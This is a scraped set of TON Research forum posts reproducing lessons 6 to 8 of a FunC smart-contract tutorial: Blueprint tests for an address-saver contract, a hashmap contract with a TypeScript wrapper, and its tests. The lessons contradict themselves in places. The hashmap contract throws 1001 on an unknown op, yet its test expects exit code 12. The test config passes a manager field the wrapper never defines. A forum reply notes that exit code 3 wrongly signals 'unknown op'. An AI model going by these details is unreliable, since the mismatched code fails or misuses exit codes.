#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/smartcontract/5lesson/fifthlesson.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/5lesson/fifthlesson.md)

```
# Lesson 5 Remembering the Address and Identifying the Operation

## Introduction

In this lesson, we will write a smart contract that can perform different operations depending on the flag in the TON blockchain using the FunC language, and we will test it in the next lesson.

## Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

You should also be able to create/deploy a project using Blueprint. You can learn how to do this in the [first lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## Op - Identifying the Operation

Before we consider what kind of smart contract we will create in this lesson, I suggest studying the [recommendations](https://docs.ton.org/develop/smart-contracts/guidelines/internal-messages) on the body of a smart contract message.

In order to create a client-server-like architecture on smart contracts, it is recommended to start each message (strictly speaking, the message body) with a 32-bit flag `op`, which will identify the operation that the smart contract should perform. The contract itself, based on the value of this flag, should perform the necessary operation and, if necessary, send a response message, which will also include some `op`.

In this lesson, we will create a smart contract that performs various actions depending on the `op`.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/5lesson/fifthlesson.md)

 

[YakovL](https://tonresear.ch/u/YakovL) October 3, 2024, 2:08pm  2

![](https://tonresear.ch/user_avatar/tonresear.ch/simpson/48/85_2.png) Simpson:

> `throw(3)`

Why? 3 is for stack overflow (see docs .ton.org/learn/tvm-instructions/tvm-exit-codes) while the conventional code for “unknown op” is `0xffff` (see the same docs). If the post is still editable, I’d suggest to update it as this is a nicely googlable series of lessons.

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 432

[TON Research](/)

# [Create Smart Contracts on TON - Lesson 6 Tests for FunC smart contract with op and query\_id](/t/create-smart-contracts-on-ton-lesson-6-tests-for-func-smart-contract-with-op-and-query-id/432)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:38pm  1

## [](#introduction-1)Introduction

In this lesson, we will write tests for the smart contract created in the fifth lesson on the TON blockchain and run them using [Blueprint](https://github.com/ton-community/blueprint).

## [](#requirements-2)Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

You should also complete the [fifth lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/5lesson/fifthlesson.md).

## [](#task-of-the-fifth-lesson-3)Task of the fifth lesson

For convenience, let me remind you here what we did in the fifth lesson. The task of the smart contract is to remember the address set by the manager and provide it to anyone who requests it, with the following functionality:

*   when the contract receives a message from the Manager with `op` equal to 1, followed by some `query_id`, followed by `MsgAddress`, it should save the received address in storage.
*   when the contract receives an internal message from any address with `op` equal to 2, followed by `query_id`, it should respond to the sender with a message body containing:
    *   `op` equal to 3
    *   the same `query_id`
    *   the Manager’s address
    *   the address that was remembered since the last manager request (empty address `addr_none` if there hasn’t been a manager request yet)
    *   the TON value attached to the message minus the processing fee.
*   when the smart contract receives any other message, it should throw an exception.

## [](#tests-for-the-smart-contract-with-op-and-query_id-4)Tests for the smart contract with op and query\_id

For our proxy smart contract, we will write the following tests:

*   Saving addresses with op = 1
*   Only the manager should be able to save the address
*   Handling op = 2
*   The contract should throw an exception for any other opcode

### [](#before-writing-the-tests-5)Before writing the tests…

Open the file `tests/AddressSaver.spec.ts` (the name may be different if you named the project differently), where our tests will be. Remember from the fourth lesson that you need to update the values in the config when deploying to the ones we set there. Also, for convenience, you can move the declaration of the `deployer` object outside the `beforeEach` function to have access to it from all tests.

### [](#testing-op-1-6)Testing op = 1

Generate a random address using the `randomAddress()` function, and then call the `sendChangeAddress` method on behalf of the `deployer` wallet.

In this case, there should be a transaction from `deployer` to `AddressSaver` with the `success = true` flag (which means that the execution of all transaction phases was successful).

```
it('should change saved address by manager', async () => {
    const address = randomAddress();
    const result = await addressSaver.sendChangeAddress(
        deployer.getSender(),
        toNano('0.01'),
        12345n,
        address
    );

    expect(result.transactions).toHaveTransaction({
        from: deployer.address,
        to: addressSaver.address,
        success: true,
    });
});
```

### [](#testing-exception-when-calling-op-1-by-someone-other-than-the-manager-7)Testing exception when calling op = 1 by someone other than the manager

In this test, we do the same as in the previous one, but call `sendChangeAddress` on behalf of another wallet `user`.

In this case, the `success` flag should be `false`.

```
it('should not change saved address by anyone else', async () => {
    let user = await blockchain.treasury('user');
    const address = randomAddress();
    const result = await addressSaver.sendChangeAddress(
        user.getSender(),
        toNano('0.01'),
        12345n,
        address
    );

    expect(result.transactions).toHaveTransaction({
        from: user.address,
        to: addressSaver.address,
        success: false,
    });
});
```

### [](#testing-op-2-8)Testing op = 2

Call `sendChangeAddress` as in the first test to successfully change the saved address. Then, using the new wallet `user`, call `sendRequestAddress`.

This call should trigger a transaction from `AddressSaver` to `user` with a message body that contains op = 3, query\_id = 12345, deployer.address, address.

```
it('should return required data on `requestAddress` call', async () => {
    const address = randomAddress();
    await addressSaver.sendChangeAddress(
        deployer.getSender(),
        toNano('0.01'),
        12345n,
        address
    );

    let user = await blockchain.treasury('user');
    const result = await addressSaver.sendRequestAddress(
        user.getSender(),
        toNano('0.01'),
        12345n
    );
    expect(result.transactions).toHaveTransaction({
        from: addressSaver.address,
        to: user.address,
        body: beginCell()
            .storeUint(3, 32)
            .storeUint(12345n, 64)
            .storeAddress(deployer.address)
            .storeAddress(address)
            .endCell(),
    });
});
```

### [](#testing-exception-for-any-other-opcodes-9)Testing exception for any other opcodes

For this test, we will use the `send` method of the `Treasury` contract. We will send a message with op = 5, for example.

Such a transaction should result in `exitCode = 3`, which we check in the test.

```
it('should throw on any other opcode', async () => {
    const result = await deployer.send({
        to: addressSaver.address,
        value: toNano('0.01'),
        body: beginCell().storeUint(5, 32).storeUint(12345n, 64).endCell(),
    });
    expect(result.transactions).toHaveTransaction({
        from: deployer.address,
        to: addressSaver.address,
        exitCode: 3,
    });
});
```

Run the tests with the command `npx blueprint test` and you should see the following:

```
 PASS  tests/AddressSaver.spec.ts
  AddressSaver
    ✓ should deploy (145 ms)
    ✓ should change saved address by manager (67 ms)
    ✓ should not change saved address by anyone else (67 ms)
    ✓ should return required data on `requestAddress` call (70 ms)
    ✓ should throw on any other opcode (89 ms)
```

If any of the tests did not pass, review the code and the text of this lesson again. Also, compare your smart contract code with the code from the previous lesson.

## [](#conclusion-10)Conclusion

I would like to say a special thank you to those who donate to support the project, it is very motivating and helps to release lessons faster. If you want to help the project (release lessons faster, translate all this into English, etc.), there are donation addresses at the bottom of the [main page](https://github.com/romanovichim/TonFunClessons_ru).

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/6lesson/sixthlesson.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/smartcontract/6lesson/sixthlesson.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/6lesson/sixthlesson.md)

```
# Lesson 6 Tests for FunC smart contract with op and query_id

## Introduction

In this lesson, we will write tests for the smart contract created in the fifth lesson on the TON blockchain and run them using [Blueprint](https://github.com/ton-community/blueprint).

## Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

You should also complete the [fifth lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/5lesson/fifthlesson.md).

## Task of the fifth lesson

For convenience, let me remind you here what we did in the fifth lesson. The task of the smart contract is to remember the address set by the manager and provide it to anyone who requests it, with the following functionality:

-   when the contract receives a message from the Manager with `op` equal to 1, followed by some `query_id`, followed by `MsgAddress`, it should save the received address in storage.
-   when the contract receives an internal message from any address with `op` equal to 2, followed by `query_id`, it should respond to the sender with a message body containing:
    -   `op` equal to 3
    -   the same `query_id`
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/6lesson/sixthlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 433

[TON Research](/)

# [Create Smart Contracts on TON - Lesson 7 Hashmap or Dictionary](/t/create-smart-contracts-on-ton-lesson-7-hashmap-or-dictionary/433)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:40pm  1

## [](#introduction-1)Introduction

In this lesson, we will write a smart contract that can perform various operations with a Hashmap - a dictionary, on the TON blockchain using the FunC language, and test it in the next lesson.

## [](#requirements-2)Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

You should also be able to create/deploy a project using Blueprint. You can learn how to do this in the [first lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## [](#hashmap-or-dictionaries-3)Hashmap or Dictionaries

A Hashmap is a data structure represented by a tree. Hashmap maps keys to values of any type, allowing for fast search and modification. In FunC, hashmaps are [represented by a cell](https://docs.ton.org/develop/func/stdlib/#dictionaries-primitives).

## [](#smart-contract-4)Smart Contract

The task of the smart contract will be to add and remove data from the key/value storage of the Hashmap, with the following functionality:

*   When the smart contract receives a message with the following structure, it should add a new key/value entry to its data:
    *   32-bit unsigned `op` equal to 1
        *   64-bit unsigned `query_id`
        *   256-bit unsigned key
        *   64-bit `valid_until` unixtime
        *   remaining slice value
*   The message for removing outdated data has the following structure: - 32-bit unsigned `op` equal to 2 - 64-bit unsigned `query_id`  
    When receiving such a message, the contract should remove all outdated entries from its data (with `valid_until` < now()). It should also check that there are no extra data in the message other than the 32-bit unsigned `op` and 64-bit unsigned `query_id`.
*   For all other internal messages, an error should be thrown.
*   A Get method `get_key` should be implemented, which takes a 256-bit unsigned key and should return an integer `valid_until` and a slice value for that key. If there is no entry for that key, an error should be thrown.
*   Important! We assume that the contract starts with an empty storage.

The contract skeleton is as follows:

```
#include "imports/stdlib.fc";

() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);

	cell data = get_data();
	slice ds = data.begin_parse();
	cell dic = ds.slice_bits() == 0 ? new_dict() : data;
	if (op == 1) {
	;; add new entry here
	}
	if (op == 2) {
	;; delete here
	}
	throw (1001);
}
```

# [](#op-1-5)op = 1

When `op` is equal to one, we add a value to the hashmap. According to the task, we need to:

*   extract the key from the message body
*   set the value in the hashmap using the key and message body
*   save the hashmap
*   end the function execution to avoid the exception declared at the end of recv\_internal()

##### [](#extract-the-key-6)Extract the key

Here, everything is the same as before, we use the `load_uint` function from the [FunC standard library](https://docs.ton.org/develop/func/stdlib/) to load an unsigned integer of n bits from the slice.

```
	if (op == 1) {
		int key = in_msg_body~load_uint(256);
	}
```

##### [](#work-with-the-hashmap-7)Work with the hashmap

To add data, we will use `dict_set`, which sets the value associated with the key index key of n-bitness in the dict dictionary, in the slice, and returns the resulting dictionary.

```
if (op == 1) { ;; add new entry
	int key = in_msg_body~load_uint(256);
	dic~udict_set(256, key, in_msg_body);

}
```

##### [](#save-the-dictionary-8)Save the dictionary

Using the `set_data()` function, we will write the cell with the hashmap to the permanent data.

```
if (op == 1) { ;; add new entry
	int key = in_msg_body~load_uint(256);
	dic~udict_set(256, key, in_msg_body);
	set_data(dic);

}
```

##### [](#end-the-function-execution-9)End the function execution

Here, it’s simple, we use the `return` statement. The final code for `op`\=1 is as follows:

```
if (op == 1) { ;; add new entry
	int key = in_msg_body~load_uint(256);
	dic~udict_set(256, key, in_msg_body);
	set_data(dic);
	return ();
}
```

# [](#op-2-10)op = 2

Here, our task is to remove all outdated entries from our data (with `valid_until` < `now()`). To iterate over the hashmap, we will use a loop. FunC has three [loops](https://docs.ton.org/develop/func/statements#loops): `repeat`, `until`, `while`.

Since we have already read `op` and `query_id`, we will check here that there is nothing in the in\_msg\_body slice using `end_parse()`.

`end_parse()` - Checks if the slice is empty. If not, throws an exception.

```
if (op == 2) {
	in_msg_body.end_parse();
}
```

For our case, we will use the `until` loop.

```
if (op == 2) {
	do {

	} until ();
}
```

To check the condition `valid_until` < `now()` at each step, we need to obtain a minimum key from our hashmap. For this purpose, the [FunC standard library](https://docs.ton.org/develop/func/stdlib/#dict_set) provides the function `udict_get_next?`.

`udict_get_next?` - Computes the minimum key k in the dict dictionary that is greater than some specified value and returns k, the associated value, and a flag indicating success. If the dictionary is empty, returns (null, null, 0).

Therefore, we set the value from which we will take the minimum key before the loop, and inside the loop, we use the flag indicating success.

```
if (op == 2) {
	int key = -1;
	do {
		(key, slice cs, int f) = dic.udict_get_next?(256, key);

	} until (~ f);
}
```

Now, using a conditional statement, we will check the condition `valid_until` < `now()`. We subtract the value of `valid_until` from the `slice cs`.

```
if (op == 2) {
	int key = -1;
	do {
		(key, slice cs, int f) = dic.udict_get_next?(256, key);
		if (f) {
			int valid_until = cs~load_uint(64);
			if (valid_until < now()) {
					;; delete here
			}
		}
	} until (~ f);
}
```

To delete from the hashmap, we will use `udict_delete?`.

`udict_delete?` - Deletes the index with the key k from the dict dictionary. If the key is present, returns the modified dictionary (hashmap) and a success flag of -1. Otherwise, returns the original dictionary dict and 0.

We get:

```
if (op == 2) {
	int key = -1;
	do {
		(key, slice cs, int f) = dic.udict_get_next?(256, key);
		if (f) {
			int valid_until = cs~load_uint(64);
			if (valid_until < now()) {
				dic~udict_delete?(256, key);
			}
		}
	} until (~ f);

}
```

##### [](#save-the-dictionary-11)Save the dictionary

Using `dict_empty?`, we check if the hashmap has become empty after our manipulations in the loop.

If there are values, we save our hashmap to the permanent data. If not, we put an empty cell there using the combination of `begin_cell().end_cell()` functions.

```
if (dic.dict_empty?()) {
		set_data(begin_cell().end_cell());
	} else {
		set_data(dic);
	}
```

##### [](#end-the-function-execution-12)End the function execution

Here, it’s simple, we use the `return` statement. The final code for `op`\=2 is as follows:

```
if (op == 2) {
	int key = -1;
	do {
		(key, slice cs, int f) = dic.udict_get_next?(256, key);
		if (f) {
			int valid_until = cs~load_uint(64);
			if (valid_until < now()) {
				dic~udict_delete?(256, key);
			}
		}
	} until (~ f);

	if (dic.dict_empty?()) {
		set_data(begin_cell().end_cell());
	} else {
		set_data(dic);
	}

	return ();
}
```

## [](#get-method-13)Get Method

The `get_key` method should return `valid_until` and the data slice for the given key. According to the task, we need to:

*   retrieve the data from the permanent data
*   find the data by key
*   throw an error if the data does not exist
*   read `valid_until`
*   return the data

##### [](#retrieve-the-permanent-data-14)Retrieve the permanent data

To load the data, we will write a separate function `load_data()`, which checks if there is any data and returns either an empty dictionary `new_dict()` or the permanent data. We will check it using `slice_bits()`, which returns the number of bits of data in the slice.

```
cell load_data() {
	cell data = get_data();
	slice ds = data.begin_parse();
	if (ds.slice_bits() == 0) {
		return new_dict();
	} else {
		return data;
	}
}
```

Now, we will call this function in the get method.

```
(int, slice) get_key(int key) method_id {
	cell dic = load_data();

}
```

##### [](#find-the-data-by-key-15)Find the data by key

To find the data by key, we will use the `udict_get?` function.

`udict_get?` - Looks up the key index in the dict dictionary. If successful, returns the found value as a slice, along with a success flag of -1. If unsuccessful, returns (null, 0).

We get:

```
(int, slice) get_key(int key) method_id {
	cell dic = load_data();
	(slice payload, int success) = dic.udict_get?(256, key);

}
```

##### [](#throw-an-error-if-the-data-does-not-exist-16)Throw an error if the data does not exist

The `udict_get?` function returns a convenient flag, which we placed in `success`.  
Using `throw_unless`, we will throw an exception.

```
(int, slice) get_key(int key) method_id {
	cell dic = load_data();
	(slice payload, int success) = dic.udict_get?(256, key);
	throw_unless(98, success);

}
```

##### [](#read-valid_until-and-return-the-data-17)Read `valid_until` and return the data

Here, it’s simple, we subtract `valid_until` from the `payload` variable and return both variables.

```
(int, slice) get_key(int key) method_id {
	cell dic = load_data();
	(slice payload, int success) = dic.udict_get?(256, key);
	throw_unless(98, success);

	int valid_until = payload~load_uint(64);
	return (valid_until, payload);
}
```

## [](#typescript-wrapper-18)TypeScript Wrapper

To interact conveniently with our smart contract, let’s write a TypeScript wrapper. The base for it is already provided by Blueprint.

### [](#contract-data-configuration-19)Contract Data Configuration

Open the file `wrappers/Hashmap.ts` (the filename may be different depending on how you created the project).  
The data configuration remains empty, as intended.

```
export type HashmapConfig = {};

export function hashmapConfigToCell(config: HashmapConfig): Cell {
    return beginCell().endCell();
}
```

Now let’s move on to the `Hashmap` class to add methods for calling the necessary operations.

### [](#method-for-calling-op-1-20)Method for calling op = 1

When calling an operation with code 1, we need to put op=1, query\_id, key, valid\_until, and the value itself in the message body. Let’s name the method `sendSet`.

```
async sendSet(
    provider: ContractProvider,
    via: Sender,
    value: bigint,
    opts: {
        queryId: bigint;
        key: bigint;
        value: Slice;
        validUntil: bigint;
    }
) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell()
            .storeUint(1, 32)
            .storeUint(opts.queryId, 64)
            .storeUint(opts.key, 256)
            .storeUint(opts.validUntil, 64)
            .storeSlice(opts.value)
            .endCell(),
    });
}
```

### [](#method-for-calling-op-2-21)Method for calling op = 2

This operation does not require additional data other than op=2 and query\_id. Let’s name the method `sendClearOldValues`.

```
async sendClearOldValues(
    provider: ContractProvider,
    via: Sender,
    value: bigint,
    opts: {
        queryId: bigint;
    }
) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell().storeUint(2, 32).storeUint(opts.queryId, 64).endCell(),
    });
}
```

### [](#method-for-calling-the-getter-get_key-22)Method for calling the getter get\_key

This method will be slightly more complicated than the one we wrote in one of the early lessons because it should return two values. Such a type in TypeScript can be defined as an array `[bigint, Slice]`. And `Promise<>` is needed because the function is asynchronous (the `async` keyword before its name).

We call `provider.get` and store the result stack in the `result` constant. Then we can read the obtained values from there for returning from the function. With the first value, everything is simple - we use `readBigNumber()` to read the `bigint` (which was `int` in FunC). But with the second value, a problem arises: the library does not provide a separate method for reading a slice (something like `readSlice()`). Therefore, we have to use `peek()`, which reads the next value, ignoring its type, and explicitly specify to the compiler that it is `TupleItemSlice`, and then get the value from it.

```
async getByKey(provider: ContractProvider, key: bigint): Promise<[bigint, Slice]> {
    const result = (await provider.get('get_key', [{ type: 'int', value: key }])).stack;
    return [result.readBigNumber(), (result.peek() as TupleItemSlice).cell.asSlice()];
}
```

## [](#conclusion-23)Conclusion

I would like to say a special thank you to those who donate to support the project. It is very motivating and helps to release lessons faster. If you want to help the project (release lessons faster, translate all this into English, etc.), there are donation addresses at the bottom of the [main page](https://github.com/romanovichim/TonFunClessons_ru).

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/7lesson/seventhlesson.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/smartcontract/7lesson/seventhlesson.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/7lesson/seventhlesson.md)

```
# Lesson 7 Hashmap or Dictionary

## Introduction

In this lesson, we will write a smart contract that can perform various operations with a Hashmap - a dictionary, on the TON blockchain using the FunC language, and test it in the next lesson.

## Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

You should also be able to create/deploy a project using Blueprint. You can learn how to do this in the [first lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## Hashmap or Dictionaries

A Hashmap is a data structure represented by a tree. Hashmap maps keys to values of any type, allowing for fast search and modification. In FunC, hashmaps are [represented by a cell](https://docs.ton.org/develop/func/stdlib/#dictionaries-primitives).

## Smart Contract

The task of the smart contract will be to add and remove data from the key/value storage of the Hashmap, with the following functionality:

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/7lesson/seventhlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 434

[TON Research](/)

# [Create Smart Contracts on TON - Lesson 8 Testing FunC for a Hashmap Smart Contract](/t/create-smart-contracts-on-ton-lesson-8-testing-func-for-a-hashmap-smart-contract/434)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:43pm  1

## [](#introduction-1)Introduction

In this lesson, we will write tests for the smart contract created in the seventh lesson on the TON blockchain and run them using [Blueprint](https://github.com/ton-community/blueprint).

## [](#requirements-2)Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

You should also complete the [seventh lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/7lesson/seventhlesson.md).

## [](#modifying-beforeeach-in-tests-for-simplification-3)Modifying `beforeEach` in tests for simplification

Open the file `tests/Hashmap.spec.ts`, which will contain our tests, and modify the `beforeEach` function, which is executed before each test.

Add the setting of the current time to it (change the value of `blockchain.now`). In addition, after a successful contract deployment, immediately try to set three test values in our hashmap using the previously written `sendSet` method.

From this point on, at the beginning of each test, the time will already be set to `500`, and three values will already be written (or not written if the smart contract is not functioning correctly).

Here is an example of the function:

```
beforeEach(async () => {
    blockchain = await Blockchain.create();

    blockchain.now = 500;

    deployer = await blockchain.treasury('deployer');

    hashmap = blockchain.openContract(
        Hashmap.createFromConfig(
            {
                manager: deployer.address,
            },
            code
        )
    );

    const deployResult = await hashmap.sendDeploy(
        deployer.getSender(),
        toNano('0.01')
    );

    expect(deployResult.transactions).toHaveTransaction({
        from: deployer.address,
        to: hashmap.address,
        deploy: true,
    });

    await hashmap.sendSet(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
        key: 1n,
        validUntil: 1000n,
        value: beginCell().storeUint(123, 16).endCell().asSlice(),
    });

    await hashmap.sendSet(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
        key: 2n,
        validUntil: 2000n,
        value: beginCell().storeUint(234, 16).endCell().asSlice(),
    });

    await hashmap.sendSet(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
        key: 3n,
        validUntil: 3000n,
        value: beginCell().storeUint(345, 16).endCell().asSlice(),
    });
});
```

## [](#testing-value-storage-and-retrieval-4)Testing value storage and retrieval

Remember that the values have already been written in `beforeEach`, so here we only need to check that the values have been written correctly.

To do this, we use the `getByKey` method we wrote and compare both the `validUntil` and `value` with the expected values (the ones we wrote in the contract).

Note that for comparing TON-specific types (such as Address or Slice), there are separate matchers. In this case, we used `toEqualSlice`, which compares two slices for equality in the test.

Repeat this procedure for all three written values, and the test is ready.

```
it('should store and retrieve values', async () => {
    let [validUntil, value] = await hashmap.getByKey(1n);
    expect(validUntil).toEqual(1000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(123, 16).endCell().asSlice()
    );

    [validUntil, value] = await hashmap.getByKey(2n);
    expect(validUntil).toEqual(2000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(234, 16).endCell().asSlice()
    );

    [validUntil, value] = await hashmap.getByKey(3n);
    expect(validUntil).toEqual(3000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(345, 16).endCell().asSlice()
    );
});
```

## [](#testing-for-an-error-when-the-key-does-not-exist-5)Testing for an error when the key does not exist

Get methods, like external messages, throw an error in the TypeScript program when they fail. Therefore, here we need to check that the `getByKey(123n)` call will result in an error. Since this method is asynchronous (called with `await`), the `await` itself should be inserted before `expect()`.

The presence of an error when calling a function can be checked using `.rejects.toThrow()`.

```
it('should throw on not found key', async () => {
    await expect(hashmap.getByKey(123n)).rejects.toThrow();
});
```

## [](#testing-for-the-removal-of-old-values-6)Testing for the removal of old values

In this test, we will need to change the value of the current time `blockchain.now`.

First, let’s try to call the value cleanup without changing the time. In this case, key `1` should be successfully found.

```
await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
    queryId: 123n,
});

let [validUntil, value] = await hashmap.getByKey(1n);
expect(validUntil).toEqual(1000n);
expect(value).toEqualSlice(beginCell().storeUint(123, 16).endCell().asSlice());
```

Next, set the time to 1001. Since `validUntil` for the first key is 1000, this key should disappear after the cleanup. At the same time, all remaining keys should remain in the contract and not change.

```
blockchain.now = 1001;

await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
    queryId: 123n,
});

await expect(hashmap.getByKey(1n)).rejects.toThrow();

[validUntil, value] = await hashmap.getByKey(2n);
expect(validUntil).toEqual(2000n);
expect(value).toEqualSlice(beginCell().storeUint(234, 16).endCell().asSlice());

[validUntil, value] = await hashmap.getByKey(3n);
expect(validUntil).toEqual(3000n);
expect(value).toEqualSlice(beginCell().storeUint(345, 16).endCell().asSlice());
```

Finally, set the time to 3001 so that all keys disappear after the cleanup. It no longer makes sense to check for the presence of the first key, as we have already checked it above.

```
blockchain.now = 3001;

await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
    queryId: 123n,
});

await expect(hashmap.getByKey(2n)).rejects.toThrow();
await expect(hashmap.getByKey(3n)).rejects.toThrow();
```

The complete code for this test:

```
it('should clear old values', async () => {
    await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
    });

    let [validUntil, value] = await hashmap.getByKey(1n);
    expect(validUntil).toEqual(1000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(123, 16).endCell().asSlice()
    );

    blockchain.now = 1001;

    await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
    });

    await expect(hashmap.getByKey(1n)).rejects.toThrow();

    [validUntil, value] = await hashmap.getByKey(2n);
    expect(validUntil).toEqual(2000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(234, 16).endCell().asSlice()
    );

    [validUntil, value] = await hashmap.getByKey(3n);
    expect(validUntil).toEqual(3000n);
    expect(value).toEqualSlice(
        beginCell().storeUint(345, 16).endCell().asSlice()
    );

    blockchain.now = 3001;

    await hashmap.sendClearOldValues(deployer.getSender(), toNano('0.05'), {
        queryId: 123n,
    });

    await expect(hashmap.getByKey(2n)).rejects.toThrow();
    await expect(hashmap.getByKey(3n)).rejects.toThrow();
});
```

## [](#testing-for-an-error-when-the-opcode-is-not-found-7)Testing for an error when the opcode is not found

To do this, we will use the `send` method of the `deployer` to send an arbitrary message. For example, we will send opcode = 123 and query\_id = 123.

Such a transaction should end with `exitCode = 12`, as we specified in the contract. We already know how to perform such checks.

```
it('should throw on wrong opcode', async () => {
    const result = await deployer.send({
        to: hashmap.address,
        value: toNano('0.05'),
        body: beginCell().storeUint(123, 32).storeUint(123, 64).endCell(),
    });
    expect(result.transactions).toHaveTransaction({
        from: deployer.address,
        to: hashmap.address,
        exitCode: 12,
    });
});
```

## [](#testing-for-an-error-with-an-incorrect-query-8)Testing for an error with an incorrect query

As we remember, op = 2 in our contract causes an error when there is extra data in the body of the message. This is ensured by calling `end_parse()`.

To check this error, as in the previous test, we will use the `send` method and send a message with opcode = 2, but also add extra data to the end of the body.

Such a transaction should end unsuccessfully, so we add the `success: false` flag to the `toHaveTransaction` matcher.

```
it('should throw on bad query', async () => {
    const result = await deployer.send({
        to: hashmap.address,
        value: toNano('0.05'),
        body: beginCell()
            .storeUint(2, 32)
            .storeUint(123, 64)
            .storeStringTail('This string should not be here!')
            .endCell(),
    });
    expect(result.transactions).toHaveTransaction({
        from: deployer.address,
        to: hashmap.address,
        success: false,
    });
});
```

## [](#running-the-tests-9)Running the tests

Run the tests with the command `npx blueprint test`, and you should see the following:

```
 PASS  tests/Hashmap.spec.ts
  Hashmap
    ✓ should store and retrieve values (173 ms)
    ✓ should throw on not found key (80 ms)
    ✓ should clear old values (95 ms)
    ✓ should throw on wrong opcode (73 ms)
    ✓ should throw on bad query (129 ms)
```

If any of the tests did not pass, review the code and text of this lesson again. Also, compare your smart contract code with the code from the previous lesson.

## [](#conclusion-10)Conclusion

I would like to say a special thank you to those who donate to support the project. It is very motivating and helps to release lessons faster. If you want to help the project (release lessons faster, translate everything into English, etc.), there are donation addresses at the bottom of the [main page](https://github.com/romanovichim/TonFunClessons_ru).

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/8lesson/eighthlesson.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/smartcontract/8lesson/eighthlesson.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/8lesson/eighthlesson.md)

```
# Lesson 8: Testing FunC for a Hashmap Smart Contract

## Introduction

In this lesson, we will write tests for the smart contract created in the seventh lesson on the TON blockchain and run them using [Blueprint](https://github.com/ton-community/blueprint).

## Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

You should also complete the [seventh lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/7lesson/seventhlesson.md).

## Modifying `beforeEach` in tests for simplification

Open the file `tests/Hashmap.spec.ts`, which will contain our tests, and modify the `beforeEach` function, which is executed before each test.

Add the setting of the current time to it (change the value of `blockchain.now`). In addition, after a successful contract deployment, immediately try to set three test values in our hashmap using the previously written `sendSet` method.

From this point on, at the beginning of each test, the time will already be set to `500`, and three values will already be written (or not written if the smart contract is not functioning correctly).

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/8lesson/eighthlesson.md)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 435

[TON Research](/)

# [Create Smart Contracts on TON - Lesson 9 Jettons - TON fungible tokens](/t/create-smart-contracts-on-ton-lesson-9-jettons-ton-fungible-tokens/435)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

